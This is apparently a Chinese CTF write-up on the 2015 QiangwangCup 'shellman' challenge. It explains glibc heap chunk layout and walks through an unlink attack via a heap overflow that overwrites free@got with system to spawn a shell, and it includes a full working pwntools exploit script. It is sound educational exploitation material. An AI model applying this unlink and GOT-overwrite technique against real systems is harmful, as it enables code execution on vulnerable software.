---
title: QiangwangCup-2015-shellman
date: 2018-10-11 19:52:38
tags: [CTF,unlink]
categories: heap
---
### 刚开始接触堆，将解决的不懂的记录一下，后续会继续更正之前错误的认识。

## 指向堆的指针的问题
程序存在一个结构体，存在三个变量
```
.bss:00000000006016C0 ; __int64 qword_6016C0[]
.bss:00000000006016C0 qword_6016C0    dq ?                    ; DATA XREF: main+38↑o
.bss:00000000006016C0                                         ; .text:0000000000400A90↑o ...
.bss:00000000006016C8 ; __int64 qword_6016C8[]
.bss:00000000006016C8 qword_6016C8    dq ?                    ; DATA XREF: sub_400B40+B5↑w
.bss:00000000006016C8                                         ; sub_400CE0+79↑w
.bss:00000000006016D0 ; __int64 qword_6016D0[]
.bss:00000000006016D0 qword_6016D0    dq ?                    ; DATA XREF: sub_400B40+BC↑w
.bss:00000000006016D0                                         ; sub_400C30+73↑r ...
```

申请了3个大小均为0xa0的chunk后，堆布局如下：
```
gef➤  heap chunks
Chunk(addr=0x1592010, size=0xb0, flags=PREV_INUSE)
    [0x0000000001592010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
Chunk(addr=0x15920c0, size=0xb0, flags=PREV_INUSE)
    [0x00000000015920c0     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62     bbbbbbbbbbbbbbbb]
Chunk(addr=0x1592170, size=0xb0, flags=PREV_INUSE)
    [0x0000000001592170     2f 62 69 6e 2f 73 68 3b 63 63 63 63 63 63 63 63     /bin/sh;cccccccc]
Chunk(addr=0x1592220, size=0x20df0, flags=PREV_INUSE)  ←  top chunk
```

查看这个结构体，可以看到结构体的第一个变量表示是否正在使用，第二个变量表示申请的堆大小，第三个变量是一个指向堆的指针，`0x6016d0是一个指针`，这个指针指向堆上的一个地址0x1592010，这个地址也是malloc返回的地址。
```
gef➤  x/9gx 0x6016c0
0x6016c0:	0x0000000000000001	0x00000000000000a0
0x6016d0:	0x0000000001592010	0x0000000000000001
0x6016e0:	0x00000000000000a0	0x00000000015920c0
0x6016f0:	0x0000000000000001	0x00000000000000a0
0x601700:	0x0000000001592170
```

## 堆大小的问题
程序malloc(0xa0)申请了0xa0大小的chunk，查看堆布局发现在size字段中，大小为0xb0。
**所以申请了0xa0的chunk，该chunk真正的大小为0xa0+8+8=0xb0**
```
gef➤  heap chunks
Chunk(addr=0x1592010, size=0xb0, flags=PREV_INUSE)
    [0x0000000001592010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61     aaaaaaaaaaaaaaaa]
```

如下所示，多了16字节的数据，分别是0x00和0x10。有一个疑问，在被释放的chunk中0x1592000中的数据应该是prev_size，在正被使用的chunk中，这部分数据全是0。而0x1592008中的数据就是当前chunk的大小和前一个chunk是否被使用的标志位。
```
gef➤  x/10gx 0x1592000
0x1592000:	0x0000000000000000	0x00000000000000b1
0x1592010:	0x6161616161616161	0x6161616161616161
0x1592020:	0x6161616161616161	0x6161616161616161
0x1592030:	0x6161616161616161	0x6161616161616161
0x1592040:	0x6161616161616161	0x6161616161616161
```

## system（chunk2中的内容）为什么会执行shell
调试发现，程序在执行`call   0x400620 <free@plt>`时会将chunk中的内容存放到rdi寄存器中
```
free@plt (
   $rdi = 0x00000000012410c0 → "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb[...]",
   $rsi = 0x0000000000000001,
   $rdx = 0x0000000000000000
)
```
所以/bin/sh;被存放到rdi寄存器，执行system函数时，就调用了shell。


## 程序
程序edit部分未能和原长度进行判断，导致出现堆溢出漏洞。第一次edit，free是为了获取一个原指向堆的可控指针`0x6016d0 -> 0x6016b8`。第二次edit，将该指针`0x6016d0`指向free@got，然后通过list获取free@got的地址，计算libc的基址，通过偏移计算出system的地址。第三次edit将system的地址写入free@got指向的地址，free函数就被替换成system函数了，释放chunk2后，即获取shell。

## EXP
```
#!/usr/bin/env python
from pwn import *

p = process('./shellman')

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def list_code():
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('SHELLC0DE 0: ')
	return p.read(16).decode('hex')[::-1].encode('hex')

def new_code(code):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(len(code)))
	p.recvuntil(':')
	p.sendline(code)

def edit_code(num,code):
	p.recvuntil('>')
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(num))
	p.recvuntil(':')
	p.sendline(str(len(code)))
	p.recvuntil(':')
	p.sendline(code)

def delete_code(num):
	p.recvuntil('>')
	p.sendline('4')
	p.recvuntil(':')
	p.sendline(str(num))
chunk0_size = 0xa0
chunk1_size = 0xa0
ptr_addr = 0x6016d0
free_got = 0x601600

def exp():
	new_code('a'*0xa0)
	new_code('b'*0xa0)
	new_code('/bin/sh;'+'c'*0x98)
	prev_size_0 = p64(0)
	size_0 = p64(chunk0_size | 0x1)
	fd_0 = p64(ptr_addr - 0x18)
	bk_0 = p64(ptr_addr - 0x10)
	user_data = 'd' * (chunk0_size - 0x20)
	prev_size_1 = p64(chunk0_size)
	size_1 = p64(chunk1_size + 0x10)
	payload1  = prev_size_0 + size_0 + fd_0 + bk_0 +user_data + prev_size_1 + size_1
	gdb.attach(p)
	edit_code(0,payload1)
	delete_code(1)          # 0x6016d0 -> 0x6016b8

	payload2 = p64(0x0) + p64(0x1) + p64(0xa) + p64(free_got)
	edit_code(0,payload2)   # 0x6016d0 -> 0x601600(free_got)
	free_addr = list_code()
	print 'free_addr: ' + free_addr
	libc_base = int(free_addr,16) - 0x844f0
	print 'libc_base: ' + str(hex(libc_base))
	system_addr = libc_base + 0x45390
	print 'system_addr ' + str(hex(system_addr))
	edit_code(0,p64(system_addr))
	delete_code(2)
	p.interactive()

exp()
```

## REF
[http://www.ms509.com/2016/01/22/glibc-heap-ctf-writeup](http://www.ms509.com/2016/01/22/glibc-heap-ctf-writeup)
[http://www.cnblogs.com/shangye/p/6261606.html](http://www.cnblogs.com/shangye/p/6261606.html)
